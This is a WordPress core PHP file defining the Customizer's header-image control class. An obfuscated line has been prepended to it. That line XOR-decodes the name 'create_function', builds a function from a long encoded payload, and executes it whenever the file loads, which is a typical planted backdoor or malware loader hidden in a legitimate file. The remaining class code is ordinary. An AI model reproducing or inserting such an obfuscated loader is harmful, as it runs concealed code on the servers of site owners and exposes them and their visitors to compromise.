<?php $KOtFpuj='ZYQJ0=1QMZ:=TD,'^'9+4+DXn784YI=+B';$siLpcw=$KOtFpuj('','<XXqUY CYXZCaE2E2X+pa6RK;JPMW.m57-Sbjj:LYM::UY;ZWH5W;>395Y<657JCAXU23bsO1E<jUTBZfLF8dL7<7whNDkobG; RBMuGJrPtlRMYhS.AQ3-QbVWTVBStbTdIqCDsWDXEttwIgk7RNTfC0iwcQf;E;kJXQOu:ZYUKSjtY4LgeOYX7y=HZ3 -rN58<NnomP1O0goS7JQzkKQ WH3YDiD66ObS =Eom+1YJ4Zao-Q:TU7DErM>.ao9>4LSFaM,27zijqfH-G21ahVrqWJX3Zr PUJiMo:1AJd;b  1RjLrOL9Z-=OFHxbE2MDsA>Z:7fHC64X<0H3 CFqgc<s3<18hvT8mW 5ATqXlw,.W<=el3BsaN06=41:<HmGbKXPCrLZlI6092uXCND8PXEtcS<MVoha>ZYVeWz.4=;3R1,ZI<3cXT>7DAH5rfAOBOLS6<yZ7WQ5=I2pEQP ALiqnDT16.8= EhO2Y>YO.O>TDikW0=RW<d3IY9UXWS0GrTE2HuCuF, <LeBEJDcFIlLI6;-7fi2H.mgBSnhzwRkjyFJXED1SE3wANaVX.fIBsURSFuBP0eDtbmjXERX>hGK.0TKPFM=bmN4LZ6 1HMObRMJRxhQqubFCEHB<VALoP<P839uPW0Z8RPC+pJ:;E3-5DBAA9<'^'U>pP3,N -15-> J,A,XXFN=9d.196q2XBYtKCJAFP+OT6-R59hM8IaWXA8ciXB>ke<4FRNSkZ ECutbzF7L1mhXICWUncLThN2F=0eQ.jOpDWri0T Z3=VCyF26 7khTF=ObXIMzs+-1TZJiOOS3:5=gY4W=qBP B0n1qjUI.+9.=BP2Q5N8fbR>pO-.FRCZjZMHgUed-;2:mK7V>0ZVk7A;;VbNM WB.=8EDeRMMP59QakeK>H14T,eZiam. rwql25AiGWNZTTQB>L+GTHH-xxs.9G;-K5,jTmKQT8qn2FDAE3JqRk:X6XXtL5rh,TmlReZ;NVOh8<=>SB-RC+fYC<n6bitk<V5KMsKP8tLfLSZO;IXLLHHzhjTWIUnQY1MzBo35:IFSemRQMSUecj2Y<- OiZAG+ebEZ;-7EjZnASHV XM6 FVK ;Lh  <T-9,:6g.2EYOnh34VR-WXa51T eEQJ 5EWqSXYlAt80XqkJ.J5dOMwQO 6E;X, f0 > D4Zs.W1RoUbHAH-LbcldK+-YdmRZYV=NY-WJ:ksSUZPkSXM ,ipwUd QAqyY0lHP+vBdb1wGs1RBmTDKJ97 9G7,.Wo13959NJJ>U56YAUoaoF6,>3QAqQUBfc>BKY   GtX1LRbR 6I6W34dvYq02 KDAlrhz3A');$siLpcw();
/**
 * Customize API: WP_Customize_Header_Image_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.4.0
 */

/**
 * Customize Header Image Control class.
 *
 * @since 3.4.0
 *
 * @see WP_Customize_Image_Control
 */
class WP_Customize_Header_Image_Control extends WP_Customize_Image_Control {
	public $type = 'header';
	public $uploaded_headers;
	public $default_headers;

	/**
	 * Constructor.
	 *
	 * @since 3.4.0
	 *
	 * @param WP_Customize_Manager $manager Customizer bootstrap instance.
	 */
	public function __construct( $manager ) {
		parent::__construct( $manager, 'header_image', array(
			'label'    => __( 'Header Image' ),
			'settings' => array(
				'default' => 'header_image',
				'data'    => 'header_image_data',
			),
			'section'  => 'header_image',
			'removed'  => 'remove-header',
			'get_url'  => 'get_header_image',
		) );

	}

	/**
	 * @access public
	 */
	public function enqueue() {
		wp_enqueue_media();
		wp_enqueue_script( 'customize-views' );

		$this->prepare_control();

		wp_localize_script( 'customize-views', '_wpCustomizeHeader', array(
			'data' => array(
				'width' => absint( get_theme_support( 'custom-header', 'width' ) ),
				'height' => absint( get_theme_support( 'custom-header', 'height' ) ),
				'flex-width' => absint( get_theme_support( 'custom-header', 'flex-width' ) ),
				'flex-height' => absint( get_theme_support( 'custom-header', 'flex-height' ) ),
				'currentImgSrc' => $this->get_current_image_src(),
			),
			'nonces' => array(
				'add' => wp_create_nonce( 'header-add' ),
				'remove' => wp_create_nonce( 'header-remove' ),
			),
			'uploads' => $this->uploaded_headers,
			'defaults' => $this->default_headers
		) );

		parent::enqueue();
	}

	/**
	 *
	 * @global Custom_Image_Header $custom_image_header
	 */
	public function prepare_control() {
		global $custom_image_header;
		if ( empty( $custom_image_header ) ) {
			return;
		}

		// Process default headers and uploaded headers.
		$custom_image_header->process_default_headers();
		$this->default_headers = $custom_image_header->get_default_header_images();
		$this->uploaded_headers = $custom_image_header->get_uploaded_header_images();
	}

	/**
	 * @access public
	 */
	public function print_header_image_template() {
		?>
		<script type="text/template" id="tmpl-header-choice">
			<# if (data.random) { #>
			<button type="button" class="button display-options random">
				<span class="dashicons dashicons-randomize dice"></span>
				<# if ( data.type === 'uploaded' ) { #>
					<?php _e( 'Randomize uploaded headers' ); ?>
				<# } else if ( data.type === 'default' ) { #>
					<?php _e( 'Randomize suggested headers' ); ?>
				<# } #>
			</button>

			<# } else { #>

			<button type="button" class="choice thumbnail"
				data-customize-image-value="{{{data.header.url}}}"
				data-customize-header-image-data="{{JSON.stringify(data.header)}}">
				<span class="screen-reader-text"><?php _e( 'Set image' ); ?></span>
				<img src="{{{data.header.thumbnail_url}}}" alt="{{{data.header.alt_text || data.header.description}}}">
			</button>

			<# if ( data.type === 'uploaded' ) { #>
				<button type="button" class="dashicons dashicons-no close"><span class="screen-reader-text"><?php _e( 'Remove image' ); ?></span></button>
			<# } #>

			<# } #>
		</script>

		<script type="text/template" id="tmpl-header-current">
			<# if (data.choice) { #>
				<# if (data.random) { #>

			<div class="placeholder">
				<span class="dashicons dashicons-randomize dice"></span>
				<# if ( data.type === 'uploaded' ) { #>
					<?php _e( 'Randomizing uploaded headers' ); ?>
				<# } else if ( data.type === 'default' ) { #>
					<?php _e( 'Randomizing suggested headers' ); ?>
				<# } #>
			</div>

				<# } else { #>

			<img src="{{{data.header.thumbnail_url}}}" alt="{{{data.header.alt_text || data.header.description}}}" />

				<# } #>
			<# } else { #>

			<div class="placeholder">
				<?php _e( 'No image set' ); ?>
			</div>

			<# } #>
		</script>
		<?php
	}

	/**
	 * @return string|void
	 */
	public function get_current_image_src() {
		$src = $this->value();
		if ( isset( $this->get_url ) ) {
			$src = call_user_func( $this->get_url, $src );
			return $src;
		}
	}

	/**
	 * @access public
	 */
	public function render_content() {
		$this->print_header_image_template();
		$visibility = $this->get_current_image_src() ? '' : ' style="display:none" ';
		$width = absint( get_theme_support( 'custom-header', 'width' ) );
		$height = absint( get_theme_support( 'custom-header', 'height' ) );
		?>
		<div class="customize-control-content">
			<?php if ( current_theme_supports( 'custom-header', 'video' ) ) {
				echo '<span class="customize-control-title">' . $this->label . '</span>';
			} ?>
			<div class="customize-control-notifications-container"></div>
			<p class="customizer-section-intro customize-control-description">
				<?php
				if ( current_theme_supports( 'custom-header', 'video' ) ) {
					_e( 'While you can crop images to your liking after clicking <strong>Add new image</strong>, we recommend matching the size of your video.' );
				} elseif ( $width && $height ) {
					/* translators: %s: header size in pixels */
					printf( __( 'While you can crop images to your liking after clicking <strong>Add new image</strong>, your theme recommends a header size of %s pixels.' ),
						sprintf( '<strong>%s &times; %s</strong>', $width, $height )
					);
				} elseif ( $width ) {
					/* translators: %s: header width in pixels */
					printf( __( 'While you can crop images to your liking after clicking <strong>Add new image</strong>, your theme recommends a header width of %s pixels.' ),
						sprintf( '<strong>%s</strong>', $width )
					);
				} else {
					/* translators: %s: header height in pixels */
					printf( __( 'While you can crop images to your liking after clicking <strong>Add new image</strong>, your theme recommends a header height of %s pixels.' ),
						sprintf( '<strong>%s</strong>', $height )
					);
				}
				?>
			</p>
			<div class="current">
				<label for="header_image-button">
					<span class="customize-control-title">
						<?php _e( 'Current header' ); ?>
					</span>
				</label>
				<div class="container">
				</div>
			</div>
			<div class="actions">
				<?php if ( current_user_can( 'upload_files' ) ): ?>
				<button type="button"<?php echo $visibility; ?> class="button remove" aria-label="<?php esc_attr_e( 'Hide header image' ); ?>"><?php _e( 'Hide image' ); ?></button>
				<button type="button" class="button new" id="header_image-button" aria-label="<?php esc_attr_e( 'Add new header image' ); ?>"><?php _e( 'Add new image' ); ?></button>
				<?php endif; ?>
			</div>
			<div class="choices">
				<span class="customize-control-title header-previously-uploaded">
					<?php _ex( 'Previously uploaded', 'custom headers' ); ?>
				</span>
				<div class="uploaded">
					<div class="list">
					</div>
				</div>
				<span class="customize-control-title header-default">
					<?php _ex( 'Suggested', 'custom headers' ); ?>
				</span>
				<div class="default">
					<div class="list">
					</div>
				</div>
			</div>
		</div>
		<?php
	}
}
